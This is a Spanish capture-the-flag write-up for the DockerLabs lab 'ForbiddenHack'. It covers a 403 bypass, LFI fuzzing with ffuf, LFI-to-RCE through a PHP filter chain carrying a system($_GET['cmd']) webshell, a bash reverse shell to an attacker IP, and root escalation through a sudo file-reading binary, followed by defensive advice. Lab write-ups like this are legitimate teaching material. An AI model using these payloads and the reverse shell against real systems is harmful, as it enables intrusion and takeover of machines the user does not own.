# ForbiddenHack — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 14/01/2025  
**Técnicas:** Nmap · 403 Bypass (Burp) · /etc/hosts · ffuf LFI · php_filter_chain_generator · Reverse Shell · CyberChef · furb/sudo · fichero oculto con contraseña root

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Bypass del 403 con Burp Suite](#2-bypass-del-403-con-burp-suite)
3. [ffuf — descubrimiento de parámetro LFI](#3-ffuf--descubrimiento-de-parámetro-lfi)
4. [php_filter_chain — RCE desde LFI](#4-php_filter_chain--rce-desde-lfi)
5. [Reverse Shell y movimiento lateral](#5-reverse-shell-y-movimiento-lateral)
6. [Escalada de privilegios — furb/sudo](#6-escalada-de-privilegios--furbsudo)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh forbiddenhack.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
|_http-title: 403 Forbidden
```

Solo puerto 80, y ya devuelve **403 Forbidden**.

---

## 2. Bypass del 403 con Burp Suite

Visitamos `http://172.17.0.2` — la página devuelve 403 pero menciona `bypass403.pw`. Añadimos el dominio a `/etc/hosts`:

```bash
sudo nano /etc/hosts
# añadir:
172.17.0.2    bypass403.pw
```

Visitamos `http://bypass403.pw` — sigue dando 403. Interceptamos la petición con Burp Suite y la enviamos al Repeater. Al reenviar la petición directamente desde Burp, obtenemos acceso al contenido:

```
By d1se0
Nadie que este autorizado puede visualizar esta página, la tenemos protegido con un 403 Forbidden.
Explora lo es todo, piensa y explora.
"Cuantos secretos guarda esta web..."
```

> 💡 El 403 puede estar basado en el User-Agent, en headers como `X-Forwarded-For`, o simplemente en el navegador. Burp permite manipular cada header para descubrir cómo está implementado el bloqueo.

---

## 3. ffuf — descubrimiento de parámetro LFI

Usamos **ffuf** para fuzear parámetros que podrían estar leyendo ficheros del sistema (LFI), usando `/etc/passwd` como valor de prueba:

```bash
ffuf -m "http://bypass403.pw/index.php?FUZZ=/etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -H "Referer: http://bypass403.pw" \
  -fs 1192
```

```
pages    [Status: 200, Size: 880, Words: 3, Lines: 20]
```

Encontramos el parámetro **pages**. Con `?pages=/etc/passwd` obtenemos el contenido del fichero.

---

## 4. php_filter_chain — RCE desde LFI

El LFI nos permite leer ficheros, pero queremos ejecutar código. Usamos **php_filter_chain_generator** para convertir el LFI en RCE:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

El script genera una cadena larga de filtros PHP que, al pasarla como valor del parámetro LFI, hace que PHP ejecute el código arbitrario. En Burp Repeater:

```
GET /index.php?cmd=id&pages=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ RCE confirmada.

---

## 5. Reverse Shell y movimiento lateral

Ponemos nc a escuchar y enviamos el payload Bash URL-encodeado a través del parámetro `cmd`:

```bash
sudo nc -lvnp 443
```

```
GET /index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.26/443+0>%261'&pages=[cadena_filtros]
```

Shell recibida como `www-data`. Exploramos el sistema:

```bash
www-data@e6de40a6d77e:/home$ ls
bambi
www-data@e6de40a6d77e:/home$ cd bambi && ls -la
drwxr-x--- 2 root    root   4096 Jun 10 11:08 .secret
-rw-r--r-- 1 root    root     33 Jun 10 11:10 user.txt
www-data@e6de40a6d77e:/home/bambi$ cd .secret && ls
interestingSecret.txt
www-data@e6de40a6d77e:/home/bambi/.secret$ cat interestingSecret.txt
bambi:c3VwZXJJzZWNyZXRwYXNzd29yZDEyMw
```

La cadena parece Base64. La decodificamos con CyberChef:

```
c3VwZXJJzZWNyZXRwYXNzd29yZDEyMw  →  superJsecretpassword123
```

```bash
www-data@e6de40a6d77e:/home/bambi/.secret$ su bambi
Password: superJsecretpassword123
bambi@e6de40a6d77e:~$
```

---

## 6. Escalada de privilegios — furb/sudo

```bash
bambi@e6de40a6d77e:~$ sudo -l
```

```
User bambi may run the following commands on e6de40a6d77e:
    (ALL : ALL) NOPASSWD: /usr/bin/furb
```

Analizamos el binario con `strings` para entender qué hace:

```bash
bambi@e6de40a6d77e:~$ strings /usr/bin/furb
Converting image ...
convert /var/www/html/gallery/uploads/images/input.png /var/www/html/.../output.jpg
Done.
```

El binario llama al comando `convert` sin ruta absoluta — si creamos un `convert` malicioso en `/tmp` y lo añadimos al PATH, se ejecutará en su lugar.

Buscamos más ficheros relacionados:

```bash
bambi@e6de40a6d77e:~$ find / -name furb* 2>/dev/null
/usr/bin/furb
/var/backups/furbRead.txt
bambi@e6de40a6d77e:~$ sudo /usr/bin/furb -r /var/backups/furbRead.txt
Interesante este nombre de archivo, donde mas puede encontrarse?
```

La pista apunta a `/root/furbRead.txt`:

```bash
bambi@e6de40a6d77e:~$ sudo /usr/bin/furb -r /root/furbRead.txt
StrongPasswordRootSuperSecret123
```

```bash
bambi@e6de40a6d77e:~$ su root
Password: StrongPasswordRootSuperSecret123
root@e6de40a6d77e:/home/bambi# whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **403 bypass** | `http://bypass403.pw` | Acceso a contenido restringido |
| **LFI → RCE con php_filter_chain** | `?pages=` | Ejecución de comandos como www-data |
| **Contraseña en fichero oculto .secret (Base64)** | `/home/bambi/.secret/` | Credencial de bambi |
| **furb lee ficheros arbitrarios de root con sudo** | `/usr/bin/furb -r` | Contraseña de root |

**Para defenderse:**
- Implementar correctamente el 403 basándolo en autenticación real, no solo en cabeceras.
- Los parámetros que leen ficheros del sistema (LFI) deben ser validados con listas blancas estrictas.
- Base64 no es cifrado — las contraseñas deben hashearse con bcrypt/Argon2.
- Los binarios con sudo que aceptan rutas arbitrarias como argumento deben revisarse cuidadosamente.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
